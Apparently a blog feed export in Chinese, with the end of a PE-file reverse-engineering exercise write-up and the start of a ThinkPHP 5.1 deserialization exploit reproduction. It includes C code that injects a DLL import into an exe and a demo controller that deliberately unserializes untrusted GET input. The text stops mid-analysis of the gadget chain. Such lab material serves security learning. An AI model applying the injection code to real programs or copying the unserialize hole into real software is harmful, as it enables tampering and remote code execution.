DWORD Import_Rva = OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>    DWORD Import_Foa = RVA_TO_FOA(Import_Rva,Buffer);<br>   <br>    PIMAGE_IMPORT_DESCRIPTOR pImport_Table =(PIMAGE_IMPORT_DESCRIPTOR)(Buffer + Import_Foa);<br>    <span class="hljs-comment">// printf(&quot;%d&quot;,OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);</span><br><br>    <span class="hljs-comment">//复制原导入表</span><br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(pImport_Table-&gt;FirstThunk)&#123;<br>        <span class="hljs-built_in">memcpy</span>(pNewSec + <span class="hljs-number">20</span>*index,(pImport_Table),<span class="hljs-number">20</span>);<br>        pImport_Table++;<br>        index++;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;name:%s\n&quot;</span>,(RVA_TO_FOA(pImport_Table-&gt;Name,Buffer)+Buffer));<br>    &#125;<br><br>    <span class="hljs-comment">//指向新复制导入表结束</span><br>    PIMAGE_IMPORT_DESCRIPTOR New_Import = PIMAGE_IMPORT_DESCRIPTOR(pNewSec + index * <span class="hljs-number">20</span>);<br><br>    <span class="hljs-comment">//新增INT表</span><br>    DWORD* New_INT = (DWORD*)(pNewSec + index * <span class="hljs-number">20</span>+ <span class="hljs-number">40</span>);<br>    <span class="hljs-comment">//新增IAT表</span><br>    DWORD* New_IAT =(DWORD*)(pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">48</span>);<br><br>    <span class="hljs-comment">//新增IMAGE_IMPORT_BY_NAME结构</span><br>    PIMAGE_IMPORT_BY_NAME New_NAME = PIMAGE_IMPORT_BY_NAME(pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">56</span>);<br><br>    <span class="hljs-built_in">memcpy</span>(New_NAME-&gt;Name,<span class="hljs-string">&quot;THE_FUNC_YOUR_DLL_EXPORT&quot;</span>,THE_LEGTH_OF_THE_FUNC);<br><br>    *New_INT = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_NAME - Buffer,Buffer);<br>    <span class="hljs-comment">//printf(&quot;%x&quot;,*(New_INT));</span><br>    *New_IAT = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_NAME - Buffer,Buffer);<br>    <span class="hljs-comment">//printf(&quot;%x&quot;,*(New_INT + 2));</span><br><br>    New_Import-&gt;OriginalFirstThunk = FOA_TO_RVA(((<span class="hljs-type">char</span>*)New_INT - Buffer),Buffer);<br>    New_Import-&gt;FirstThunk = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_IAT - Buffer,Buffer);<br><br>    <span class="hljs-type">char</span>* New_DLL_NAME = pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">memcpy</span>(New_DLL_NAME,<span class="hljs-string">&quot;YOU_DLL_NAME&quot;</span>,YOUR_DLL_NAME_LENGTH_PLUS_1);<br><br>    New_Import-&gt;Name = FOA_TO_RVA(New_DLL_NAME - Buffer,Buffer);<br><br><br>    OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = NewSec-&gt;VirtualAddress;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;YOUR_PATH_TO_EXE&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;YOUR_PATH_TO_EXE_PATHCHED&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    new_buffer = Section_add(fp1,buffer);<br>    DLL_INJECT(new_buffer);<br><br>    fwrite(new_buffer,size+ADD_SIZE,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-首先删除hello25-exe引入函数节所有数据，然后将所有引入的DLL名字及函数名重新定义在引入函数节开始部分，之后继续修改引入函数节其他部分（需要时可再修改DataDirectory相关项），使得该程序再次恢复原有功能。"><a href="#6-首先删除hello25-exe引入函数节所有数据，然后将所有引入的DLL名字及函数名重新定义在引入函数节开始部分，之后继续修改引入函数节其他部分（需要时可再修改DataDirectory相关项），使得该程序再次恢复原有功能。" class="headerlink" title="6.首先删除hello25.exe引入函数节所有数据，然后将所有引入的DLL名字及函数名重新定义在引入函数节开始部分，之后继续修改引入函数节其他部分（需要时可再修改DataDirectory相关项），使得该程序再次恢复原有功能。"></a>6.首先删除hello25.exe引入函数节所有数据，然后将所有引入的DLL名字及函数名重新定义在引入函数节开始部分，之后继续修改引入函数节其他部分（需要时可再修改DataDirectory相关项），使得该程序再次恢复原有功能。</h3><p>这题明确要求我们删除导入表的所有数据，然后再自己重构一个导入表，这就要求我们对导入表有一个比较充分的认识。</p><p>如果你认认真真看了第四题，并且动手操作过，那么这题我相信你也一定做得出来:)</p><p>首先我们还是定位到导入表的位置</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-20%20225124.png"></p><p>这里再贴出与导入表相关的所有数据</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20020535.png"></p><p>其实这里面最重要的是那些字符串数据，其他的都是地址我们都可以一个一个计算出来。</p><p>现在让我们尝试重构一个导入表吧</p><p>我们先复制这些字符串</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20020744.png"></p><p>然后在下面填入导入表结构，有两个dll，所以需要两个导入表，其中每张表的INT还有IAT我们现在是不知道的，那就索性填零，先空着</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20021105.png"></p><p>这里直接空一行在<code>0x700</code>开始，一方面是因为要阻断<code>uer32.dll</code>字符串，一方面是方便计算</p><p>如图填入两张导入表共计10个DWORD，其中dll名字我们是可以计算的，利用FOA转RVA即可</p><p>接下来就需要补充每张表各自的INT和IAT了，所谓的INT和IAT，其具体项都是一个DWORD，指向另外一个结构体<code> _IMAGE_IMPORT_BY_NAME</code>，这个结构体由一个WORD型数据和字符串数据组成，字符串也就是具体函数名，即我们刚刚所复制的</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20021718.png"></p><p>NOTE：始终要记住，每一张表结束的标志都是同等大小（即每一项是4字节大小，则至少有4字节全0）的全0结构，这里我就直接空行以方便计算</p><p>稍微解释一下，这里<code>0x740</code>处的<code>B0 20 00 00</code>是作为第一张表的INT，它指向FOA<code>6B0</code>的数据<code>80 00 45 78 69 74 50 72 6F 63 65 73 73</code>，也就是一个WORD型数据加一个字符串的数据类型,然后空4字节作为INT的结束，然后是IAT表，其值与INT一样。</p><p>下面<code>0x750</code>，<code>0x760</code>两行也是一样</p><p>有了INT和IAT就可以填入导入表结构了</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20022243.png"></p><p>最后别忘了修改数据目录项的导入表地址</p><p>当你欣喜做完这一切的时候，你会发现你无法运行你的exe，即使你使用PE相关工具已经能够成功解析导入表数据</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20022441.png"></p><p>不知你是否还记得在问题4做的小实验，程序在调用系统函数是直接调用系统函数吗？</p><p>其实不是，是通过jmp去IAT表来调用系统函数，程序在装进内存中时，操作系统就会把要用到的其他DLL函数一项一项填入IAT表（回忆PE文件装载过程）</p><p>让我们把程序丢去x32dbg查看，并转去查看内存<code>0x4021000</code>(导入表的位置)</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20022935.png"></p><p>可以发现画了红线的地方，就是IAT的地方，可以再去找找<code>MessageBoxA</code>函数地址，一定就是在这里面</p><p>再来看看汇编代码</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20023113.png"></p><p>果然出问题了，下面的三个jmp不知道jmp去了哪里。</p><p>这是因为在没有改之前，这三个jmp是jmp去IAT表的，而IAT表是存放了函数地址的，那我们现在都把IAT表改了，这里跳转的地址却没有改，当然无法运行。因此这里只需要改一改jmp的地址就可以了（重定位表就干这事儿用的）</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20023409.png"></p><p>(Patch流程：右键-&gt;汇编；如果你懂得一点汇编代码，那么这会是非常简单的问题；当然汇编也不是什么难事)</p><p>现在程序就可以正常运行啦~</p><h3 id="7-使用16进制编辑器提取ZoomIt程序中尺寸最大的图标，并存储为-ico文件，确认ico文件打开可显示对应图标。"><a href="#7-使用16进制编辑器提取ZoomIt程序中尺寸最大的图标，并存储为-ico文件，确认ico文件打开可显示对应图标。" class="headerlink" title="7.使用16进制编辑器提取ZoomIt程序中尺寸最大的图标，并存储为.ico文件，确认ico文件打开可显示对应图标。"></a>7.使用16进制编辑器提取ZoomIt程序中尺寸最大的图标，并存储为.ico文件，确认ico文件打开可显示对应图标。</h3><p>首先我们可以通过数据目录项的第三项找到资源表位置，这里直接使用PE查看器寻找</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20095150.png"></p><p>可以看到资源表在文件偏移67E00处，转去16进制编辑器查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20095325.png"></p><p>现在就需要知道PE文件资源的编排方式</p><p>简单来说</p><p>PE 文件中的资源是按照 资源类型 -&gt; 资源ID -&gt; 资源代码页 的3层树型目录结构来组织资源的，通过层层索引才能够进入相应的子目录找到正确的资源。</p><p>每一层都是以IMAGE_RESOURCE_DIRECTORY结构为头部的，并且后面跟着一个IMAGE_RESOURCE_DIRECTORY_ENTRY结构数组。其中IMAGE_RESOURCE_DIRECTORY负责指出后面数组中的成员个数，IMAGE_RESOURCE_DIRECTORY_ENTRY数组成员分别指向下一层目录结构。</p><p><img src="https://tse2-mm.cn.bing.net/th/id/OIP-C.hou04PHNnyDzQ7tAY1SovwHaE0?w=287&h=187&c=7&r=0&o=5&dpr=2&pid=1.7"></p><p>结构IMAGE_RESOURCE_DIRECTORY定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span><br>    DWORD   Characteristics;      <span class="hljs-comment">//属性，一般为0</span><br>    DWORD   TimeDateStamp;        <span class="hljs-comment">//资源的产生时刻，一般为0</span><br>    WORD    MajorVersion;         <span class="hljs-comment">//主版本号，一般为0</span><br>    WORD    MinorVersion;         <span class="hljs-comment">//次版本号，一般为0</span><br>    WORD    NumberOfNamedEntries; <span class="hljs-comment">//以名称（字符串）命名的资源数量</span><br>    WORD    NumberOfIdEntries;    <span class="hljs-comment">//以ID（整型数字）命名的资源数量</span><br>&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;<br> <br></code></pre></td></tr></table></figure><p>IMAGE_RESOURCE_DIRECTORY_ENTRY定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            DWORD NameOffset:<span class="hljs-number">31</span>;<br>            DWORD NameIsString:<span class="hljs-number">1</span>;<br>        &#125;;<br>        DWORD   Name;<br>        WORD    Id;<br>    &#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   OffsetToData;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            DWORD   OffsetToDirectory:<span class="hljs-number">31</span>;<br>            DWORD   DataIsDirectory:<span class="hljs-number">1</span>;<br>        &#125;;<br>    &#125;;<br>&#125; <br></code></pre></td></tr></table></figure><p>看着很大其实就是2个DWORD大小，也就8字节（struct的语法意思为分配一个DWORD大小，其中最高位做NameIsString，低31位做NameOffset）</p><h4 id="第一层："><a href="#第一层：" class="headerlink" title="第一层："></a>第一层：</h4><p>现在就一层一层的来找，第一层数据如下</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20095947.png"></p><p>红色框是结构<code>_IMAGE_RESOURCE_DIRECTORY</code>，可知<code>NumberOfNamedEntries</code>为1，<code>NumberOfIdEntries</code>为8，两者加起来就是结构<code>_IMAGE_RESOURCE_DIRECTORY_ENTRY </code>数量，所以后面就有9个<code>_IMAGE_RESOURCE_DIRECTORY_ENTRY </code>结构，也即绿色方框的内容</p><p>再使用<code>_IMAGE_RESOURCE_DIRECTORY_ENTRY </code>来解读</p><p>这里的前四个字节是表示资源类型（使用Id字段），后四个字节表示这个资源类型的偏移（使用结构体字段，最高位表示是否为目录偏移），但要注意这里的偏移是相对整个资源的，即地址<code>0x67E00</code></p><p>资源类型对应如下</p><p><img src="https://img-blog.csdnimg.cn/20190106153858693.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poeXVsbw==,size_16,color_FFFFFF,t_70"></p><p>所以我们只需要寻找前4个字节为<code>03</code>的就可以了，</p><p>也即地址<code>0x67E20</code>处，后四字节的低31位表示偏移，即<code>0x90</code>，转去<code>0x67E90</code>处</p><h4 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h4><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20101017.png"></p><p>这里的排列与第一层是一模一样的，红色框是结构体<code>IMAGE_RESOURCE_DIRECTORY</code>，绿色框是结构体数组<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>，</p><p>直接分析结构体<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>，</p><p>前四字节可能使用<code>NameIsString、NameOffset、Id</code>，这取决于最高位。如果NameIsString&#x3D;1，说明该资源以名称(UNICODE编码的字符串)定义的，NameOffset是名称的相对整个资源结构的偏移地址。相反，如果NameIsString&#x3D;0，说明该资源以ID(整型数字)定义的，ID号为Id。显然这里都是以ID导出的，即<code>3,4,5,6,7</code></p><p>后面四字节使用OffsetToDirectory，与第一层一样，代表了第三层的数据偏移地址，同样是相对整个资源结构来说的。</p><p>那就直接转去<code>0x67E00+0x1E0=0x67FE0</code>查看</p><h4 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h4><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20101613.png"></p><p>与前两层一样，第二层起始于一个IMAGE_RESOURCE_DIRECTORY头，后面紧接着是IMAGE_RESOURCE_DIRECTORY_ENTRY数组，但不同的是数组个数&#x3D;1。</p><p>IMAGE_RESOURCE_DIRECTORY_ENTRY使用的是Name与OffsetToData，分别代表了资源语言类型与资源数据相对地址。Name是指语言内码，表示资源类型信息。</p><p>OffsetToData是相对整个资源结构的偏移地址，指向一个IMAGE_RESOURCE_DATA_ENTRY结构体，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span><br>    DWORD   OffsetToData;  <span class="hljs-comment">//资源数据的RVA</span><br>    DWORD   Size;          <span class="hljs-comment">//资源数据的长度</span><br>    DWORD   CodePage;      <span class="hljs-comment">//代码页, 一般为0</span><br>    DWORD   Reserved;      <span class="hljs-comment">//保留字段</span><br>&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;<br></code></pre></td></tr></table></figure><p>这个结构体描述一个具体的资源。那现在就转去<code>0x67E00+0x3D8=0x681D8</code>查看</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20102232.png"></p><p>所以这个资源数据偏移RVA是<code>0x6C880</code>，转换成FOA就是<code>0x68680</code>，大小是<code>0x2E8</code>。</p><p>至此就可以找到所有的资源，并比较大小</p><p>这里介绍一个工具，<code>Resoure hacker</code>，可以方便的找到所有资源，当然也可以自己来写一个脚本来遍历提取:)</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20102731.png"></p><p>其ID也是我们之前找到的<code>3,4,5,6,7</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20102819.png"></p><p>Binary起始地址也是我们找到的<code>0x68680</code></p><p>说明我们分析正确啦~</p><p>现在就可以方便的提图标了~~</p><h3 id="8-将hello25-exe程序的ImageBase从00400000H修改为00600000H，然后通过对该程序其他位置进行相应修改，使得该程序功能恢复正常。"><a href="#8-将hello25-exe程序的ImageBase从00400000H修改为00600000H，然后通过对该程序其他位置进行相应修改，使得该程序功能恢复正常。" class="headerlink" title="8.将hello25.exe程序的ImageBase从00400000H修改为00600000H，然后通过对该程序其他位置进行相应修改，使得该程序功能恢复正常。"></a>8.将hello25.exe程序的ImageBase从00400000H修改为00600000H，然后通过对该程序其他位置进行相应修改，使得该程序功能恢复正常。</h3><p>如果你做了第六题，那么这题就很容易，当然没有做的话，也是很容易的</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20103617.png"></p><p>把注意力放在地址<code>0x401005,0x40100A,0x40101B,0x401020</code>以及最下面的三个<code>jmp</code>指令，你会发现他们的操作码都是地址，而这个地址是由<code>ImageBase+RVA</code>决定的，如果我们改变了<code>ImageBase</code>，那么这个地址就会受到影响，我们就需要去修复这些地址。</p><p>实际上重定位表记录的就是这些需要修正的地址，操作系统就检查是否按照预计的<code>ImageBase</code>加载，如果不是就查重定位表一项一项的去修。我们现在要做的，就是这个工作。</p><p>但是如果你使用PE查看器去找这个exe的重定位表，你会发现找不到，因为它根本就没有。</p><p>其原因是exe的<code>ImageBase</code>是比较小的，且它是优先装载，绝大多数情况下都会按照预计的<code>ImageBase</code>装载，只有极少情况下会改变，比如我们手动去改。</p><p>但是重定位表对于DLL来说是十分重要的，因为一个exe可能使用很多的DLL，而DLL全部都处于高2G，那就很容易发生冲突，就不能装载到预定位置，于是会被装载到其他地方，此时就需要重定位表来修复。</p><p>那么这里没有重定位表咋整？</p><p>没有就没有吧，反正这个程序也简单，需要修改的地址也就是我列出来的那几个，把他们的操作码全部加上<code>0x200000</code>就可以了，也就是改成<code>0x6xxxxx</code>形式</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20104831.png"></p><p>然后再利用PE工具修改<code>ImageBase</code>就可以啦</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20104950.png"></p><p>再用32dbg打开验证</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20105100.png"></p><p>成功~</p>]]></content>
    
    
    <categories>
      
      <category>SYSU</category>
      
      <category>Software</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP_5.1.* 反序列化复现</title>
    <link href="/2023/10/08/ThinkPHP/"/>
    <url>/2023/10/08/ThinkPHP/</url>
    
    <content type="html"><![CDATA[<p>ThinkPHP 5.1.* 反序列化漏洞复现</p><span id="more"></span><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>使用命令<code>composer create-project topthink/think tp5.1 &quot;5.1.*&quot;</code>创建一个名为<code>tp5.1</code>的项目，版本为<code>5.1.*</code></p><p>进入<code>tp5.1</code>，使用命令<code>php think run</code>启动</p><p>在<code>tp5.1/application/index/controller/Index.php</code>创建处理函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ThinkPHP5&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello,&#x27;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">demo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$code</span>));<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>进入<code>tp5.1/route/route.php</code>创建路由</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;demo&#x27;</span>, <span class="hljs-string">&#x27;index/demo&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>访问<code>http://myhost.local/ThinkPHP/tp5.1/public/demo</code>即可</p><h2 id="反序列化链分析"><a href="#反序列化链分析" class="headerlink" title="反序列化链分析"></a>反序列化链分析</h2><p>ThinkPHP_5.1的漏洞入口在<code>think\process\pipes\windows</code>的<code>__destruct()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">removeFiles</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>$this-&gt;close()</code>无法利用，能够利用的是<code>$this-&gt;removeFiles()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">removeFiles</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable language_">$this</span>-&gt;files = [];<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到在<code>removeFiles()</code>里面使用了<code>file_exists()</code>函数，这里会把<code>$filename</code>当做一个字符串来处理，而<code>$this-&gt;files</code>又可控，这意味着我们可以使用任何一个实现了<code>__toString()</code>的类，最终选择使用<code> think\model\concern</code>的<code>trait Conversion</code>，注意这里是<code>trait</code>，无法实例化，需要找一个实现此<code>trait</code>的类才可以实例化，这后面会提到。</p><p>先来看<code>__toString()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code 